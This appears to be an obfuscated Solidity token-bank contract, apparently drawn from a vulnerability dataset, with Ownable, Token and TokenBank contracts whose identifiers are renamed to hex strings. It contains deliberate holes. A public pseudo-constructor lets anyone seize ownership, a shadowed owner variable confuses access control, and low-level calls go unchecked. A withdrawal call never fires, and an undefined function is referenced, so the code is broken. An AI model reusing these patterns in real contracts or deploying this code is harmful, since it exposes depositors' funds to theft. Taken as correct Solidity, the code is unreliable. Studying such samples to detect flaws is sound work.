// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Ownable
{
    address _0xe51783;
    address _0xf79e8f = msg.sender;

    function _0x174197(address _0xe9590a)
    public
    _0x036f74
    {
        _0xe51783 = _0xe9590a;
    }

    function _0xe827e2()
    public
    {
        if(msg.sender==_0xe51783)
        {
            _0xf79e8f=_0xe51783;
        }
    }

    modifier _0x036f74
    {
        if(_0xf79e8f == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0xf79e8f = msg.sender;
    function WithdrawToken(address _0x26e110, uint256 _0xab4ca3,address _0x355a65)
    public
    _0x036f74
    {
        _0x26e110.call(bytes4(_0x0802b4("transfer(address,uint256)")),_0x355a65,_0xab4ca3);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0x2181a3()
    public
    {
        _0xf79e8f = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>=MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0x6cba11,address _0x34eb69,uint _0x714221)
    public
    _0x036f74
    {
        if(Holders[_0x6cba11]>0)
        {
            Holders[_0x6cba11]=0;
            WithdrawToken(_0x34eb69,_0x714221,_0x6cba11);
        }
    }

    function WithdrawToHolder(address _0xa00af2, uint _0xb92dc0)
    public
    _0x036f74
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_0xa00af2]>=_0xb92dc0)
            {
                _0xa00af2.call.value(_0xb92dc0);
                Holders[_0xa00af2]-=_0xb92dc0;
            }
        }
    }

    function Bal() public constant returns(uint){return this.balance;}
}